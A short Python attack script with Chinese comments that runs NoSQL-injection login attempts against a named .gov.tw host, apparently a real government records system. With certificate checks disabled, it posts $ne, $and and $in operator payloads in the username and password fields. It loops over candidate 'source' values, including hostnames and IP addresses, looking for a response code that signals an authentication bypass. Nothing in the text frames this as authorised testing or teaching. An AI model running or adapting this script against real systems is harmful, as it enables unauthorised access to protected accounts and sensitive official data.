import requests, json, urllib3, time
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"
def login(body, note=""):
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    s.get(BASE+"/captcha",timeout=10)
    try:
        r=s.post(BASE+"/login",json=body,timeout=10); return r.status_code, r.text
    except Exception as e: return None, repr(e)

print("=== 用 $and 多文档形式 + source 过滤 (找白名单 source) ===")
# $and 触发多文档(403). 加 source $eq 特定值 -> 若该 source 在白名单且有多用户 -> 可能不同响应
# 但 source $eq 单文档会500. 用 source $in [值] 保持多文档
sources=["localhost","epcr.tpf.gov.tw","118.163.107.93","35.234.50.28","AUTH_SERVER","PORTAL","WEB","API","SYSTEM","ADMIN","TPF","PORT","EPCR","GOV"]
# 方式1: username $ne + source $in [src] -> 多文档且source限定
for src in sources:
    body={"username":{"$ne":None},"password":{"$ne":None},
          "captcha":"1","domain":"AUTH_SERVER"}
    # 尝试在顶层加 source (虽被忽略, 但试 $and 嵌套)
    for form, b in [
        ("top", {**body, "source":{"$in":[src]}}),
        ("and-src", {"username":{"$and":[{"$ne":None},{"source":{"$eq":src}}]},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}),
        ("and-src-in", {"username":{"$and":[{"$ne":None},{"source":{"$in":[src]}}]},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}),
    ]:
        code,t=login(b)
        mark=" ***" if code not in (500,403,None) else ""
        if form=="and-src-in":  # 只看最可能的
            print(f"  source={src:20s} and-in -> {code} {t[:55]}{mark}")
        time.sleep(0.05)
print("DONE")
